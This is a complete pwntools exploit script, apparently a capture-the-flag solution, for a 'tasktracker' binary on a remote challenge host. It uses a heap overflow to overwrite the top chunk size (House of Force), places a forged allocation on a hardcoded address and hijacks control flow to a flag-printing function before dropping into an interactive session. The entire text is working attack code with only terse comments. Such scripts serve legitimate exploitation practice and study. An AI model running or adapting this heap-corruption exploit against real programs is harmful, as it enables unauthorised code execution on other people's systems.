from pwn import *
import sys

exe = ELF("./tasktracker")
host = "ctf-85ib.balancedcompo.site"
port = 9997

def malloc(size, data):
    sla('Your choice:', '2')
    sla('Please enter the length of task name:', str(size))
    sla('Please enter the name of task:', data)

def edit(index, size, data):
    sla('Your choice:', '3')
    sla('Please enter the index of the task you want to change:', str(index))
    sla('Enter the length of task name:', str(size))
    sla('Enter the new task name:', data)

def exploit(p):
    # House of Force

    # Overwrite top chunk size with 0xffffffffffffffff
    payload = "A"*24 + p64(0xffffffffffffffff)
    malloc(8, "A"*8)
    edit(0, 64, payload)
    
    target = 0x1802860
    top_chunk = 0x18028f0
    offset = top_chunk - target + 8

    # Overwrite vtable
    malloc(-offset, p64(0x0))
    malloc(8, p64(0xdeadbeef))
    
    # Call function to print flag 
    rip = 0x0000000000400D51
    payload = "A"*56 + p64(rip)
    edit(2, 100, payload)

    sl('1')

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
